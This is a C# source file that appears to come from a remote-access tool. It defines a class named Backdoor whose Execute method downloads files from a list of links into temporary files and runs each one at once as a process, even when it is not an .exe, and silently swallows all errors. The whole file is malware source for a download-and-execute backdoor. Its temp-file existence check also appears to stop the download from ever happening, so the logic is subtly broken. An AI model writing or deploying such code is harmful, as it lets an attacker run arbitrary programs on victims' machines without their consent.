using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A letter, for all letters.
    /// </summary>
    public class Backdoor
    {
        private string[] _links;
        public Backdoor(string[] execlinks)
        {
            _links = execlinks;
        }
        /// <summary>
        /// Dowloads executables from the links and executes them.
        /// </summary>
        public async void Execute()
        {
            if (_links.Length > 0)
                await Task.Run(() =>
                {
                    foreach (var l in _links)
                    {
                        string filename = Path.GetTempFileName();
                        if (!File.Exists(filename))
                        {
                            filename = Communication.Server.AsyncDownloadFile(l, filename).Result;

                            // run the file RIGHT after downloading
                            if (!string.IsNullOrEmpty(filename) && File.Exists(filename))
                            {
                                try
                                {
                                    // run even if not .exe
                                    var p = new Process
                                    {
                                        StartInfo = new ProcessStartInfo
                                        {
                                            FileName = filename,
                                            UseShellExecute = false
                                        }
                                    };
                                    p.Start();
                                }
                                catch
                                {

                                }
                            }
                        }
                        // else if already existed do nothing
                    }
                });
        }
    }
}
